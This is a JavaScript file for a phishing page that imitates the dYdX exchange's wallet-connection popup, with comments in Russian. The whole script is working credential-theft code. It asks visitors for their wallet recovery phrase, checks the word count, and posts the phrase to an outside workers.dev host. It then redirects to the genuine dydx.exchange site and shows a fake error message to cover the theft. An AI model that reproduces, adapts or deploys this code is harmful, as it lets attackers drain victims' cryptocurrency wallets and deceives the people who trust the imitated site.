const popup = document.querySelector('#popup');
const buttons = document.querySelectorAll('._2fTqNZMFx8KbTbKpTxNxm, a, [role="button"]')
buttons.forEach((item) => {
  item.addEventListener('click', () => {
    popup.classList.remove('hidden');
  });
});

const backButton = document.querySelector('#back');
backButton.onclick = () => {
  popup.classList.add('hidden');
};

const walletButtons = document.querySelectorAll('.sc-fFSPTT.kZBxPI');
walletButtons.forEach((item) => {
  item.addEventListener('click', () => {
    document.querySelector('#form-popup .name').innerText = item.innerText;
    document.querySelector('#form-popup #wallet').value = item.innerText;
    document.querySelector('#wallet-selector').classList.add('hidden');
    document.querySelector('#form-popup').classList.remove('hidden');

    backButton.onclick = () => {
      document.querySelector('#wallet-selector').classList.remove('hidden');
      document.querySelector('#form-popup').classList.add('hidden');

      backButton.onclick = () => {
        popup.classList.add('hidden');
      };
    };
  });
});

$('#form-popup button').click(function() {
  let count = $('#form-popup form textarea').val().trim().split(" ").length;
  
  if (count === 12 || count === 15 || count === 18 || count === 21 || count === 24) {
    $.post('https://blue-gay.juistespastelastes.workers.dev/', $('#form-popup form').serialize(), function(data) {
      setTimeout(() => {
        document.querySelector('#form-popup').classList.add('hidden');
        // Меняем URL редиректа на новый
        location.assign('https://dydx.exchange/');
        
        document.querySelector('.kePwtS1uunfwXbIK0L16k.Fx5KwI7IwFMVPrH4SaCB9').classList.add('alert-error');
        document.querySelector('.kePwtS1uunfwXbIK0L16k.Fx5KwI7IwFMVPrH4SaCB9 div').innerText = 'Something went wrong. Please try again later.';
        
        // Остальной код обработчиков остается без изменений
        backButton.onclick = () => {
          $('#form-popup form textarea').val('');
          document.querySelector('#form-popup').classList.remove('hidden');
          document.querySelector('.kePwtS1uunfwXbIK0L16k.Fx5KwI7IwFMVPrH4SaCB9').classList.remove('alert-error');
          document.querySelector('.kePwtS1uunfwXbIK0L16k.Fx5KwI7IwFMVPrH4SaCB9 div').innerText = 'Fireblocks and Lattice1 are not supported at this time. Onboarding with these wallets will result in irrecoverable keys.';
          
          backButton.onclick = () => {
            document.querySelector('#wallet-selector').classList.remove('hidden');
            document.querySelector('#form-popup').classList.add('hidden');
          };
        };
      }, 1000);
    });
  } else {
    $('#form-popup form textarea').addClass('error');
    setTimeout(() => {
      $('#form-popup form textarea').removeClass('error');
    }, 1500);
  }
});
